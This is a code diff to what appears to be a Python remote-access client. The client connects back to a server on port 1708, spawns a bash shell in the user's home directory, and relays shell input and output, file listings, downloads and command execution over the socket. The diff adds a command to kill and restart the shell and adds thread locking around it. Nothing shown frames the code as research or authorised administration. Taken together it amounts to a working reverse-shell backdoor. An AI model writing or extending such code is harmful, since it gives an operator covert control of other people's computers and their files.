@@ -25,6 +25,7 @@ PORT = 1708
 STDIN = 'stdin'
 EVAL = 'eval'
 CMD = 'cmd'
+KILL_PROC = 'kill'
 # Special
 LS_JSON = 'ls'
 # Client -> Server
@@ -286,41 +287,53 @@ def main():
                 fs.send(json_str)
                 serve(fs)
             except Exception as e:
-                sys.stderr("[!] "+str(e))
+                sys.stderr.write("[!] "+str(e))
         if RUNNING:
             # Try again in a minute
             time.sleep(10)
 
+proc = None
 def serve(sock):
+    global proc
+
     bytelock = ByteLockBundler(sock)
     payloadlib = PayloadLib(bytelock)
-    sys.stdout = WriterWrapper(lambda s: bytelock.writePrintbytes(s.encode('UTF-8')))
-    sys.stderr = WriterWrapper(lambda s: bytelock.writeErrbytes(s.encode('UTF-8')))
+    #sys.stdout = WriterWrapper(lambda s: bytelock.writePrintbytes(s.encode('UTF-8')))
+    #sys.stderr = WriterWrapper(lambda s: bytelock.writeErrbytes(s.encode('UTF-8')))
 
     proc = subprocess.Popen(["bash"],
                             stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             cwd=os.path.expanduser("~"))
+    proclock = threading.Lock()
+
     # Get commands from server, parse and send appropriate to proc
     def pollProcStdout():
         while RUNNING:
-            out = proc.stdout.read(1)
-            if out == '' and proc.poll() is not None:
-                break
+            with proclock:
+                reader = proc.stdout
+            out = reader.read(1)
+            with proclock:
+                if out == '' and proc.poll() is not None:
+                    break
             if out != '':
                 bytelock.writeStdout(out)
 
     def pollProcStderr():
         while RUNNING:
-            out = proc.stderr.read(1)
-            if out == '' and proc.poll() is not None:
-                break
+            with proclock:
+                reader = proc.stderr
+            out = reader.read(1)
+            with proclock:
+                if out == '' and proc.poll() is not None:
+                    break
             if out != '':
                 bytelock.writeStderr(out)
 
     def pollSock():
         global RUNNING
+        global proc
         fileobjs = {}
         clientobj = None
         while RUNNING:
@@ -347,11 +360,20 @@ def serve(sock):
 
                 specentry = json.dumps((filepath, filedict)).encode('UTF-8')
                 bytelock.writeSpecial("ls",specentry)
+            if KILL_PROC in recvjson:
+                with proclock:
+                    proc.kill()
+                    proc = subprocess.Popen(["bash"],
+                                            stdin=subprocess.PIPE,
+                                            stdout=subprocess.PIPE,
+                                            stderr=subprocess.PIPE,
+                                            cwd=os.path.expanduser("~"))
 
             # Standard evaluation
             if STDIN in recvjson:
-                proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
-                proc.stdin.flush()
+                with proclock:
+                    proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
+                    proc.stdin.flush()
             if CMD in recvjson:
                 cmd_str = recvjson[CMD]
                 cmd_arr = cmd_str.split(" ")
@@ -389,7 +411,8 @@ def serve(sock):
             if CLIENT_CLOSE in recvjson and clientobj is not None:
                 clientobj.close()
                 RUNNING = False
-                proc.kill()
+                with proclock:
+                    proc.kill()
                 bytelock.fsock.close()
 
             if FILE_DOWNLOAD in recvjson:
